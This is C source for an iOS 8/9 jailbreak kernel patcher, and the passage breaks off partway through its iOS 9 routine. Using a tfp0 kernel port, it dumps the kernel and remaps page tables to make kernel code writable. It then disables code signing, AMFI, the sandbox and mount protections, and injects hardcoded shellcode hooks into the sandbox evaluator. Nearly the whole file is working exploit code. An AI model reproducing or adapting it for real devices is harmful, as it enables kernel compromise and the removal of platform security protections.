#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/kauth.h>
#include <sys/mount.h>
#include <spawn.h>
#include <fcntl.h>
#include <pthread.h>

#include <mach/mach.h>

#ifdef UNTETHER
#include <IOKit/IOKitLib.h>
#else
#include "../IOKit/IOKitLib.h"
#endif

#include "../sock_port_2_legacy/sockpuppet.h"
#include "jailbreak.h"
#include "patchfinder.h"
#include "mac_policy_ops.h"

struct utsname u = { 0 };

uint32_t tte_virt;
uint32_t tte_phys;

kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);

mach_port_t tfp0;
bool isIOS9 = false;
bool isA5 = false;

void copyin(void* to, uint32_t from, size_t size) {
    mach_vm_size_t outsize = size;
    size_t szt = size;
    if (size > 0x1000) {
        size = 0x1000;
    }
    size_t off = 0;
    while (1) {
        mach_vm_read_overwrite(tfp0, off+from, size, (mach_vm_offset_t)(off+to), &outsize);
        szt -= size;
        off += size;
        if (szt == 0) {
            break;
        }
        size = szt;
        if (size > 0x1000) {
            size = 0x1000;
        }
    }
}

void copyout(uint32_t to, void* from, size_t size) {
    mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
}

uint32_t rk8(uint32_t addr) {
    uint8_t val = 0;
    copyin(&val, addr, 1);
    return val;
}

uint32_t wk8(uint32_t addr, uint8_t val) {
    copyout(addr, &val, 1);
    return val;
}

uint32_t rk16(uint32_t addr) {
    uint16_t val = 0;
    copyin(&val, addr, 2);
    return val;
}

uint32_t wk16(uint32_t addr, uint16_t val) {
    copyout(addr, &val, 2);
    return val;
}

uint32_t rk32(uint32_t addr) {
    uint32_t val = 0;
    copyin(&val, addr, 4);
    return val;
}

uint32_t wk32(uint32_t addr, uint32_t val) {
    copyout(addr, &val, 4);
    return val;
}

void patch_page_table(uint32_t tte_virt, uint32_t tte_phys, uint32_t page) {
    uint32_t i = page >> 20;
    uint32_t j = (page >> 12) & 0xFF;
    uint32_t addr = tte_virt+(i<<2);
    uint32_t entry = rk32(addr);
    if ((entry & L1_PAGE_PROTO) == L1_PAGE_PROTO) {
        uint32_t page_entry = ((entry & L1_COARSE_PT) - tte_phys) + tte_virt;
        uint32_t addr2 = page_entry+(j<<2);
        uint32_t entry2 = rk32(addr2);
        if (entry2) {
            uint32_t new_entry2 = (entry2 & (~L2_PAGE_APX));
            wk32(addr2, new_entry2);
        }
    } else if ((entry & L1_SECT_PROTO) == L1_SECT_PROTO) {
        uint32_t new_entry = L1_PROTO_TTE(entry);
        new_entry &= ~L1_SECT_APX;
        wk32(addr, new_entry);
    }
    usleep(10000);
}

uint32_t wk32_exec(addr, val) {
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    return wk32(addr, val);
}

void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize) {
    for (vm_address_t addr = kernel_base, e = 0; addr < kernel_base + ksize; addr += CHUNK_SIZE, e += CHUNK_SIZE) {
        pointer_t buf = 0;
        vm_address_t sz = 0;
        vm_read(tfp0, addr, CHUNK_SIZE, &buf, &sz);
        if (buf == 0 || sz == 0)
            continue;
        bcopy((uint8_t *)buf, dest + e, CHUNK_SIZE);
    }
}

void patch_bootargs(uint32_t addr){
    //printf("set bootargs\n");
    uint32_t bootargs_addr = rk32(addr) + 0x38;
    const char* new_bootargs = "cs_enforcement_disable=1 amfi_get_out_of_my_way=1";
    
    // evasi0n6
    size_t new_bootargs_len = strlen(new_bootargs) + 1;
    size_t bootargs_buf_len = (new_bootargs_len + 3) / 4 * 4;
    char bootargs_buf[bootargs_buf_len];
    
    strlcpy(bootargs_buf, new_bootargs, bootargs_buf_len);
    memset(bootargs_buf + new_bootargs_len, 0, bootargs_buf_len - new_bootargs_len);
    copyout(bootargs_addr, bootargs_buf, bootargs_buf_len);
}

// sandbox stuff
// by xerub's iloader
unsigned int
make_b_w(int pos, int tgt)
{
    int delta;
    unsigned int i;
    unsigned short pfx;
    unsigned short sfx;
    
    unsigned int omask_1k = 0xB800;
    unsigned int omask_2k = 0xB000;
    unsigned int omask_3k = 0x9800;
    unsigned int omask_4k = 0x9000;
    
    unsigned int amask = 0x7FF;
    int range;
    
    range = 0x400000;
    
    delta = tgt - pos - 4; /* range: 0x400000 */
    i = 0;
    if(tgt > pos) i = tgt - pos - 4;
    if(tgt < pos) i = pos - tgt - 4;
    
    if (i < range){
        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
        sfx =  omask_1k | ((delta >>  1) & amask);
        
        return (unsigned int)pfx | ((unsigned int)sfx << 16);
    }
    
    if (range < i && i < range*2){ // range: 0x400000-0x800000
        delta -= range;
        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
        sfx =  omask_2k | ((delta >>  1) & amask);
        
        return (unsigned int)pfx | ((unsigned int)sfx << 16);
    }
    
    if (range*2 < i && i < range*3){ // range: 0x800000-0xc000000
        delta -= range*2;
        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
        sfx =  omask_3k | ((delta >>  1) & amask);
        
        return (unsigned int)pfx | ((unsigned int)sfx << 16);
    }
    
    if (range*3 < i && i < range*4){ // range: 0xc00000-0x10000000
        delta -= range*3;
        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
        sfx =  omask_4k | ((delta >>  1) & amask);
        return (unsigned int)pfx | ((unsigned int)sfx << 16);
    }
    
    return -1;
}

unsigned int
make_bl(int pos, int tgt)
{
    int delta;
    unsigned short pfx;
    unsigned short sfx;
    
    unsigned int omask = 0xF800;
    unsigned int amask = 0x07FF;
    
    delta = tgt - pos - 4; /* range: 0x400000 */
    pfx = 0xF000 | ((delta >> 12) & 0x7FF);
    sfx =  omask | ((delta >>  1) & amask);
    
    return (unsigned int)pfx | ((unsigned int)sfx << 16);
}

uint32_t find_kernel_pmap(uintptr_t kernel_base) {
    uint32_t pmap_addr;

    if(isA5) {
        printf("A5(X) ");
        if (strstr(u.version, "3248.6") || strstr(u.version, "3248.5") || strstr(u.version, "3248.4")) {
            printf("9.3-9.3.4\n");
            pmap_addr = 0x3f6454;
        } else if (strstr(u.version, "3248.31") || strstr(u.version, "3248.21")) {
            printf("9.2-9.2.1\n");
            pmap_addr = 0x3ef444;
        } else if (strstr(u.version, "3248.10")) {
            printf("9.1\n");
            pmap_addr = 0x3f8444;
        } else if (strstr(u.version, "3248.1.") || strstr(u.version, "3247.1.88")) {
            printf("9.0-9.0.2\n");
            pmap_addr = 0x3f7444;
        } else if (strstr(u.version, "2784")) {
            printf("8.3-8.4.1\n");
            pmap_addr = 0x3a211c;
        } else if (strstr(u.version, "2783.5")) {
            printf("8.2\n");
            pmap_addr = 0x39411c;
        } else if (strstr(u.version, "2783.3.26")) {
            printf("8.1.3\n");
            pmap_addr = 0x39211c;
        } else {
            printf("8.0-8.1.2\n");
            pmap_addr = 0x39111c;
        }
    } else {
        printf("A6(X) ");
        if (strstr(u.version, "3248.6") || strstr(u.version, "3248.5") || strstr(u.version, "3248.4")) {
            printf("9.3-9.3.4\n");
            pmap_addr = 0x3fe454;
        } else if (strstr(u.version, "3248.31") || strstr(u.version, "3248.21")) {
            printf("9.2-9.2.1\n");
            pmap_addr = 0x3f6444;
        } else if (strstr(u.version, "3248.10")) {
            printf("9.1\n");
            pmap_addr = 0x3ff444;
        } else if (strstr(u.version, "3248.1.") || strstr(u.version, "3247.1.88")) {
            printf("9.0-9.0.2\n");
            pmap_addr = 0x3fd444;
        } else if (strstr(u.version, "2784")) {
            printf("8.3-8.4.1\n");
            pmap_addr = 0x3a711c;
        } else if (strstr(u.version, "2783.5")) {
            printf("8.2\n");
            pmap_addr = 0x39a11c;
        } else {
            printf("8.0-8.1.3\n");
            pmap_addr = 0x39711c;
        }
    }
    printf("using offset 0x%08x for pmap\n",pmap_addr);
    return pmap_addr + kernel_base;
}

// debugger 1 and 2 for a5(x) 9.x
uint32_t find_PE_i_can_has_debugger_1(void) {
    uint32_t PE_i_can_has_debugger_1;
    if (strstr(u.version, "3248.60")) {
        printf("9.3.3-9.3.4\n");
        PE_i_can_has_debugger_1 = 0x3a82d4;
    } else if (strstr(u.version, "3248.50")) {
        printf("9.3.2\n");
        PE_i_can_has_debugger_1 = 0x3a7ff4;
    } else if (strstr(u.version, "3248.41")) {
        printf("9.3-9.3.1\n");
        PE_i_can_has_debugger_1 = 0x3a7ea4;
    } else if (strstr(u.version, "3248.31")) {
        printf("9.2.1\n");
        PE_i_can_has_debugger_1 = 0x3a1434;
    } else if (strstr(u.version, "3248.21")) {
        printf("9.2\n");
        PE_i_can_has_debugger_1 = 0x3a12c4;
    } else if (strstr(u.version, "3248.10")) {
        printf("9.1\n");
        PE_i_can_has_debugger_1 = 0x3aa734;
    } else {
        printf("9.0-9.0.2\n");
        PE_i_can_has_debugger_1 = 0x3a8fc4;
    }
    return PE_i_can_has_debugger_1;
}

uint32_t find_PE_i_can_has_debugger_2(void) {
    uint32_t PE_i_can_has_debugger_2;
    if (strstr(u.version, "3248.6") || strstr(u.version, "3248.5") || strstr(u.version, "3248.4")) {
        printf("9.3.x\n");
        PE_i_can_has_debugger_2 = 0x456070;
    } else if (strstr(u.version, "3248.31") || strstr(u.version, "3248.21")) {
        printf("9.2-9.2.1\n");
        PE_i_can_has_debugger_2 = 0x44f070;
    } else if (strstr(u.version, "3248.10")) {
        printf("9.1\n");
        PE_i_can_has_debugger_2 = 0x457860;
    } else {
        printf("9.0-9.0.2\n");
        PE_i_can_has_debugger_2 = 0x4567d0;
    }
    return PE_i_can_has_debugger_2;
}

void unjail8(uint32_t kbase){
    printf("[*] jailbreaking...\n");
    
    printf("[*] running kdumper\n");
    size_t ksize = 0xFFE000;
    void *kdata = malloc(ksize);
    dump_kernel(kbase, kdata, ksize);
    
    /* patchfinder */
    printf("[*] running patchfinder\n");
    uint32_t proc_enforce = kbase + find_proc_enforce(kbase, kdata, ksize);
    uint32_t cs_enforcement_disable_amfi = kbase + find_cs_enforcement_disable_amfi(kbase, kdata, ksize);
    uint32_t PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1(kbase, kdata, ksize);
    uint32_t PE_i_can_has_debugger_2 = kbase + find_i_can_has_debugger_2(kbase, kdata, ksize);
    uint32_t p_bootargs = kbase + find_p_bootargs(kbase, kdata, ksize);
    uint32_t vm_fault_enter = kbase + find_vm_fault_enter_patch_84(kbase, kdata, ksize);
    uint32_t vm_map_enter = kbase + find_vm_map_enter_patch(kbase, kdata, ksize);
    uint32_t vm_map_protect = kbase + find_vm_map_protect_patch_84(kbase, kdata, ksize);
    uint32_t mount_patch = kbase + find_mount_84(kbase, kdata, ksize) + 1;
    uint32_t mapForIO = kbase + find_mapForIO(kbase, kdata, ksize);
    uint32_t sandbox_call_i_can_has_debugger = kbase + find_sandbox_call_i_can_has_debugger(kbase, kdata, ksize);
    uint32_t sb_patch = kbase + find_sb_patch(kbase, kdata, ksize);
    uint32_t memcmp_addr = find_memcmp(kbase, kdata, ksize);
    uint32_t vn_getpath = find_vn_getpath(kbase, kdata, ksize);
    uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
    uint32_t csops2_addr = kbase + find_csops2(kbase, kdata, ksize);
    //uint32_t kernel_pmap = kbase + find_pmap_location(kbase, kdata, ksize);
    uint32_t kernel_pmap = find_kernel_pmap(kbase);
    
    printf("[PF] proc_enforce:               %08x\n", proc_enforce);
    printf("[PF] cs_enforcement_disable:     %08x\n", cs_enforcement_disable_amfi);
    printf("[PF] PE_i_can_has_debugger_1:    %08x\n", PE_i_can_has_debugger_1);
    printf("[PF] PE_i_can_has_debugger_2:    %08x\n", PE_i_can_has_debugger_2);
    printf("[PF] p_bootargs:                 %08x\n", p_bootargs);
    printf("[PF] vm_fault_enter:             %08x\n", vm_fault_enter);
    printf("[PF] vm_map_enter:               %08x\n", vm_map_enter);
    printf("[PF] vm_map_protect:             %08x\n", vm_map_protect);
    printf("[PF] mount_patch:                %08x\n", mount_patch);
    printf("[PF] mapForIO:                   %08x\n", mapForIO);
    printf("[PF] sb_call_i_can_has_debugger: %08x\n", sandbox_call_i_can_has_debugger);
    printf("[PF] sb_evaluate:                %08x\n", sb_patch);
    printf("[PF] memcmp:                     %08x\n", memcmp_addr);
    printf("[PF] vn_getpath:                 %08x\n", vn_getpath);
    printf("[PF] csops:                      %08x\n", csops_addr);
    printf("[PF] csops2:                     %08x\n", csops2_addr);
    printf("[PF] kernel_pmap:                %08x\n", kernel_pmap);

    printf("[*] get kernel_pmap_store, tte_virt, tte_phys\n");
    uint32_t kernel_pmap_store = rk32(kernel_pmap);
    tte_virt = rk32(kernel_pmap_store);
    tte_phys = rk32(kernel_pmap_store+4);
    printf("[*] kernel pmap store @ 0x%08x\n", kernel_pmap_store);
    printf("[*] kernel pmap tte is at VA 0x%08x PA 0x%08x\n", tte_virt, tte_phys);

    printf("[*] running kernelpatcher\n");

    /* proc_enforce: -> 0 */
    printf("[*] proc_enforce\n");
    wk32(proc_enforce, 0);
    
    /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
    printf("[*] cs_enforcement_disable_amfi\n");
    wk8(cs_enforcement_disable_amfi, 1);
    wk8(cs_enforcement_disable_amfi-4, 1);
    
    /* debug_enabled -> 1 */
    printf("[*] debug_enabled\n");
    wk32(PE_i_can_has_debugger_1, 1);
    wk32(PE_i_can_has_debugger_2, 1);
    
    /* bootArgs */
    printf("[*] bootargs\n");
    patch_bootargs(p_bootargs);
    
    /* vm_fault_enter */
    printf("[*] vm_fault_enter\n");
    wk32_exec(vm_fault_enter, 0x2201bf00);

    /* vm_map_enter */
    printf("[*] vm_map_enter\n");
    wk32_exec(vm_map_enter, 0x4280bf00);
    
    /* vm_map_protect: set NOP */
    printf("[*] vm_map_protect\n");
    wk32_exec(vm_map_protect, 0xbf00bf00);
    
    /* mount patch */
    printf("[*] mount patch\n");
    patch_page_table(tte_virt, tte_phys, (mount_patch & ~0xFFF));
    wk8(mount_patch, 0xe0);
    
    /* mapForIO: prevent kIOReturnLockedWrite error */
    printf("[*] mapForIO\n");
    wk32_exec(mapForIO, 0xbf00bf00);
    
    /* csops */
    printf("[*] csops\n");
    wk32_exec(csops_addr, 0xbf00bf00);
    
    patch_page_table(tte_virt, tte_phys, (csops2_addr & ~0xFFF));
    wk8(csops2_addr, 0x20);
    
    /* sandbox */
    printf("[*] sandbox\n");
    wk32_exec(sandbox_call_i_can_has_debugger, 0xbf00bf00);
    
    /* sb_evaluate */
    unsigned char taig32_payload[] = {
        0x1f, 0xb5, 0x06, 0x9b, 0xad, 0xf5, 0x82, 0x6d, 0x1c, 0x6b, 0x01, 0x2c,
        0x36, 0xd1, 0x5c, 0x6b, 0x00, 0x2c, 0x33, 0xd0, 0x69, 0x46, 0x5f, 0xf4,
        0x80, 0x60, 0x0d, 0xf5, 0x80, 0x62, 0x10, 0x60, 0x20, 0x46, 0x11, 0x11,
        0x11, 0x11, 0x1c, 0x28, 0x01, 0xd0, 0x00, 0x28, 0x26, 0xd1, 0x68, 0x46,
        0x17, 0xa1, 0x10, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x28, 0x1f, 0xd0,
        0x68, 0x46, 0x0f, 0xf2, 0x61, 0x01, 0x13, 0x22, 0x22, 0x22, 0x22, 0x22,
        0x00, 0x28, 0x0f, 0xd1, 0x68, 0x46, 0x0f, 0xf2, 0x65, 0x01, 0x31, 0x22,
        0x22, 0x22, 0x22, 0x22, 0x00, 0x28, 0x0f, 0xd0, 0x68, 0x46, 0x0f, 0xf2,
        0x87, 0x01, 0x27, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x28, 0x07, 0xd1,
        0x0d, 0xf5, 0x82, 0x6d, 0x01, 0xbc, 0x00, 0x21, 0x01, 0x60, 0x18, 0x21,
        0x01, 0x71, 0x1e, 0xbd, 0x0d, 0xf5, 0x82, 0x6d, 0x05, 0x98, 0x86, 0x46,
        0x1f, 0xbc, 0x01, 0xb0, 0xcc, 0xcc, 0xcc, 0xcc, 0xdd, 0xdd, 0xdd, 0xdd,
        0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72,
        0x2f, 0x74, 0x6d, 0x70, 0x00, 0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74,
        0x65, 0x2f, 0x76, 0x61, 0x72, 0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65,
        0x00, 0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61,
        0x72, 0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 0x2f, 0x4c, 0x69, 0x62,
        0x72, 0x61, 0x72, 0x79, 0x2f, 0x50, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65,
        0x6e, 0x63, 0x65, 0x73, 0x2f, 0x63, 0x6f, 0x6d, 0x2e, 0x61, 0x70, 0x70,
        0x6c, 0x65, 0x00, 0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f,
        0x76, 0x61, 0x72, 0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 0x2f, 0x4c,
        0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f, 0x50, 0x72, 0x65, 0x66, 0x65,
        0x72, 0x65, 0x6e, 0x63, 0x65, 0x73, 0x00, 0x00
    };
    
    uint32_t payload_base = 0xb00; // taig8
    size_t payload_len = 272;
    
    uint32_t vn_getpath_bl = make_bl(payload_base+0x22, vn_getpath);
    uint32_t memcmp_bl_1 = make_bl(payload_base+0x34, memcmp_addr);
    uint32_t memcmp_bl_2 = make_bl(payload_base+0x44, memcmp_addr);
    uint32_t memcmp_bl_3 = make_bl(payload_base+0x54, memcmp_addr);
    uint32_t memcmp_bl_4 = make_bl(payload_base+0x64, memcmp_addr);
    uint32_t sb_evaluate_val = rk32(sb_patch);
    uint32_t back_sb_evaluate = make_b_w(payload_base+0x8c, (sb_patch+4-kbase));
    
    *(uint32_t*)(taig32_payload+0x22) = vn_getpath_bl;
    *(uint32_t*)(taig32_payload+0x34) = memcmp_bl_1;
    *(uint32_t*)(taig32_payload+0x44) = memcmp_bl_2;
    *(uint32_t*)(taig32_payload+0x54) = memcmp_bl_3;
    *(uint32_t*)(taig32_payload+0x64) = memcmp_bl_4;
    *(uint32_t*)(taig32_payload+0x88) = sb_evaluate_val;
    *(uint32_t*)(taig32_payload+0x8c) = back_sb_evaluate;
    
    void* sandbox_payload = malloc(payload_len);
    memcpy(sandbox_payload, taig32_payload, payload_len);
    
    // hook sb_evaluate
    printf("[*] sb_evaluate\n");
    patch_page_table(tte_virt, tte_phys, ((kbase + payload_base) & ~0xFFF));
    copyout((kbase + payload_base), sandbox_payload, payload_len);
    
    printf("[*] sb_evaluate_hook\n");
    uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
    wk32_exec(sb_patch, sb_evaluate_hook);

    printf("[*] patch tfp0\n");
    uint32_t tfp0_patch = kbase + find_tfp0_patch(kbase, kdata, ksize);
    printf("[PF] tfp0_patch: %08x\n", tfp0_patch);
    wk32_exec(tfp0_patch, 0xbf00bf00);
    
    printf("enable patched.\n");
}

void unjail9(uint32_t kbase){
    printf("[*] jailbreaking...\n");
    
    printf("[*] running kdumper\n");
    size_t ksize = 0xFFE000;
    void *kdata = malloc(ksize);
    dump_kernel(kbase, kdata, ksize);
     
    /* patchfinder */
    printf("[*] running patchfinder\n");
    uint32_t proc_enforce = kbase + find_proc_enforce(kbase, kdata, ksize);
    uint32_t cs_enforcement_disable_amfi = kbase + find_cs_enforcement_disable_amfi(kbase, kdata, ksize);
    uint32_t p_bootargs = kbase + find_p_bootargs_generic(kbase, kdata, ksize);
    uint32_t vm_fault_enter = kbase + find_vm_fault_enter_patch(kbase, kdata, ksize);
    uint32_t vm_map_enter = kbase + find_vm_map_enter_patch(kbase, kdata, ksize);
    uint32_t vm_map_protect = kbase + find_vm_map_protect_patch(kbase, kdata, ksize);
    uint32_t sandbox_call_i_can_has_debugger = kbase + find_sandbox_call_i_can_has_debugger(kbase, kdata, ksize);
    uint32_t sb_patch = kbase + find_sb_evaluate_90(kbase, kdata, ksize);
    uint32_t memcmp_addr = find_memcmp(kbase, kdata, ksize);
    uint32_t vn_getpath = find_vn_getpath(kbase, kdata, ksize);
    uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
    uint32_t amfi_file_check_mmap = kbase + find_amfi_file_check_mmap(kbase, kdata, ksize);
    uint32_t kernel_pmap = find_kernel_pmap(kbase);
    uint32_t PE_i_can_has_debugger_1;
    uint32_t PE_i_can_has_debugger_2;
    uint32_t mount_patch;
    uint32_t mapForIO;
    uint32_t i_can_has_kernel_configuration_got;
    uint32_t lwvm_jump;

    if (isA5) {
        PE_i_can_has_debugger_1 = kbase + find_PE_i_can_has_debugger_1();
        PE_i_can_has_debugger_2 = kbase + find_PE_i_can_has_debugger_2();
    } else {
        PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1_90(kbase, kdata, ksize);
        PE_i_can_has_debugger_2 = kbase + find_i_can_has_debugger_2_90(kbase, kdata, ksize);
    }

    if (strstr(u.version, "3248.1.")) {
        mount_patch = kbase + find_mount_90(kbase, kdata, ksize);
    } else {
        mount_patch = kbase + find_mount(kbase, kdata, ksize);
    }

    if (strstr(u.version, "3248.6") || strstr(u.version, "3248.5") || strstr(u.version, "3248.4")) {
        i_can_has_kernel_configuration_got = kbase + find_PE_i_can_has_kernel_configuration_got(kbase, kdata, ksize);
        lwvm_jump = kbase + find_lwvm_jump(kbase, kdata, ksize);
        printf("[PF] i_can_has_kernel_configuration_got: %08x\n", i_can_has_kernel_configuration_got);
        printf("[PF] lwvm_jump:                  %08x\n", lwvm_jump);
    } else {
        mapForIO = kbase + find_mapForIO(kbase, kdata, ksize);
        printf("[PF] mapForIO:                   %08x\n", mapForIO);
    }

    printf("[PF] proc_enforce:               %08x\n", proc_enforce);
    printf("[PF] cs_enforcement_disable:     %08x\n", cs_enforcement_disable_amfi);
    printf("[PF] PE_i_can_has_debugger_1:    %08x\n", PE_i_can_has_debugger_1);
    printf("[PF] PE_i_can_has_debugger_2:    %08x\n", PE_i_can_has_debugger_2);
    printf("[PF] p_bootargs:                 %08x\n", p_bootargs);
    printf("[PF] vm_fault_enter:             %08x\n", vm_fault_enter);
    printf("[PF] vm_map_enter:               %08x\n", vm_map_enter);
    printf("[PF] vm_map_protect:             %08x\n", vm_map_protect);
    printf("[PF] mount_patch:                %08x\n", mount_patch);
    printf("[PF] sb_call_i_can_has_debugger: %08x\n", sandbox_call_i_can_has_debugger);
    printf("[PF] sb_evaluate:                %08x\n", sb_patch);
    printf("[PF] memcmp:                     %08x\n", memcmp_addr);
    printf("[PF] vn_getpath:                 %08x\n", vn_getpath);
    printf("[PF] csops:                      %08x\n", csops_addr);
    printf("[PF] amfi_file_check_mmap:       %08x\n", amfi_file_check_mmap);
    printf("[PF] kernel_pmap:                %08x\n", kernel_pmap);

    printf("[*] get kernel_pmap_store, tte_virt, tte_phys\n");
    uint32_t kernel_pmap_store = rk32(kernel_pmap);
    tte_virt = rk32(kernel_pmap_store);
    tte_phys = rk32(kernel_pmap_store+4);
    printf("[*] kernel pmap store @ 0x%08x\n", kernel_pmap_store);
    printf("[*] kernel pmap tte is at VA 0x%08x PA 0x%08x\n", tte_virt, tte_phys);
    
    printf("[*] running kernelpatcher\n");
    
    /* proc_enforce: -> 0 */
    printf("[*] proc_enforce\n");
    wk32(proc_enforce, 0);
    
    /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
    printf("[*] cs_enforcement_disable_amfi\n");
    wk8(cs_enforcement_disable_amfi, 1);
    wk8(cs_enforcement_disable_amfi-1, 1);
    
    /* bootArgs */
    printf("[*] bootargs\n");
    patch_bootargs(p_bootargs);
    
    /* debug_enabled -> 1 */
    printf("[*] debug_enabled\n");
    wk32_exec(PE_i_can_has_debugger_1, 1);
    wk32_exec(PE_i_can_has_debugger_2, 1);
    
    /* vm_fault_enter */
    printf("[*] vm_fault_enter\n");
    patch_page_table(tte_virt, tte_phys, (vm_fault_enter & ~0xFFF));
    wk16(vm_fault_enter, 0x2201);
    
    /* vm_map_enter */
    printf("[*] vm_map_enter\n");
    wk32_exec(vm_map_enter, 0xbf00bf00);
    
    /* vm_map_protect: set NOP */
    printf("[*] vm_map_protect\n");
    wk32_exec(vm_map_protect, 0xbf00bf00);
    
    /* mount patch */
    printf("[*] mount patch\n");
    patch_page_table(tte_virt, tte_phys, (mount_patch & ~0xFFF));
    if (strstr(u.version, "3248.1.")) {
        wk8(mount_patch, 0xe7);
    } else {
        wk8(mount_patch, 0xe0);
    }
    
    /* mapForIO: prevent kIOReturnLockedWrite error */
    printf("[*] mapForIO\n");
    if (strstr(u.version, "3248.6") || strstr(u.version, "3248.5") || strstr(u.version, "3248.4")) {
        wk32_exec(i_can_has_kernel_configuration_got, lwvm_jump);
    } else {
        wk32_exec(mapForIO, 0xbf00bf00);
    }
    
    /* csops */
    printf("[*] csops\n");
    wk32_exec(csops_addr, 0xbf00bf00);
    
    /* amfi_file_check_mmap */
    printf("[*] amfi_file_check_mmap\n");
    wk32_exec(amfi_file_check_mmap, 0xbf00bf00);
    
    /* sandbox */
    printf("[*] sandbox\n");
    wk32_exec(sandbox_call_i_can_has_debugger, 0xbf00bf00);
    
    /* sb_evaluate */
    unsigned char pangu9_payload[] = {
        0x1f, 0xb5, 0xad, 0xf5, 0x82, 0x6d, 0x1c, 0x6b, 0x01, 0x2c, 0x34, 0xd1,
        0x5c, 0x6b, 0x00, 0x2c, 0x31, 0xd0, 0x69, 0x46, 0x5f, 0xf4, 0x80, 0x60,
        0x0d, 0xf5, 0x80, 0x62, 0x10, 0x60, 0x20, 0x46, 0x11, 0x11, 0x11, 0x11,
        0x1c, 0x28, 0x01, 0xd0, 0x00, 0x28, 0x24, 0xd1, 0x68, 0x46, 0x17, 0xa1,
        0x10, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x28, 0x1d, 0xd0, 0x68, 0x46,
        0x0f, 0xf2, 0x5c, 0x01, 0x13, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x28,
        0x0d, 0xd1, 0x68, 0x46, 0x18, 0xa1, 0x31, 0x22, 0x22, 0x22, 0x22, 0x22,
        0x00, 0x28, 0x0e, 0xd0, 0x68, 0x46, 0x22, 0xa1, 0x27, 0x22, 0x22, 0x22,
        0x22, 0x22, 0x00, 0x28, 0x07, 0xd1, 0x0d, 0xf5, 0x82, 0x6d, 0x01, 0xbc,
        0x00, 0x21, 0x01, 0x60, 0x18, 0x21, 0x01, 0x71, 0x1e, 0xbd, 0x0d, 0xf5,
        0x82, 0x6d, 0x05, 0x98, 0x86, 0x46, 0x1f, 0xbc, 0x01, 0xb0, 0xcc, 0xcc,
        0xcc, 0xcc, 0xdd, 0xdd, 0xdd, 0xdd, 0x00, 0xbf, 0x2f, 0x70, 0x72, 0x69,
        0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72, 0x2f, 0x74, 0x6d, 0x70,
        0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72,
        0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 0x00, 0x2f, 0x70, 0x72, 0x69,
        0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72, 0x2f, 0x6d, 0x6f, 0x62,
        0x69, 0x6c, 0x65, 0x2f, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f,
        0x50, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6e, 0x63, 0x65, 0x73, 0x2f,
        0x63, 0x6f, 0x6d, 0x2e, 0x61, 0x70, 0x70, 0x6c, 0x65, 0x00, 0x00, 0xbf,
        0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72,
        0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 0x2f, 0x4c, 0x69, 0x62, 0x72,
        0x61, 0x72, 0x79, 0x2f, 0x50, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6e,
        0x63, 0x65, 0x73, 0x00, 0x02, 0x00, 0x00, 0x00
    };
    
    uint32_t payload_base = 0xb00; // taig8
    size_t payload_len = 0x110;
    
    uint32_t vn_getpath_bl = make_bl(payload_base+0x20, vn_getpath);
    uint32_t memcmp_bl_1 = make_bl(payload_base+0x32, memcmp_addr);
    uint32_t memcmp_bl_2 = make_bl(payload_base+0x42, memcmp_addr);
    uint32_t memcmp_bl_3 = make_bl(payload_base+0x50, memcmp_addr);
    uint32_t memcmp_bl_4 = make_bl(payload_base+0x5e, memcmp_addr);
    uint32_t sb_evaluate_val = rk32(sb_patch);
    uint32_t back_sb_evaluate = make_b_w(payload_base+0x86, (sb_patch+4-kbase));
    
    *(uint32_t*)(pangu9_payload+0x20) = vn_getpath_bl;
    *(uint32_t*)(pangu9_payload+0x32) = memcmp_bl_1;
    *(uint32_t*)(pangu9_payload+0x42) = memcmp_bl_2;
    *(uint32_t*)(pangu9_payload+0x50) = memcmp_bl_3;
    *(uint32_t*)(pangu9_payload+0x5e) = memcmp_bl_4;
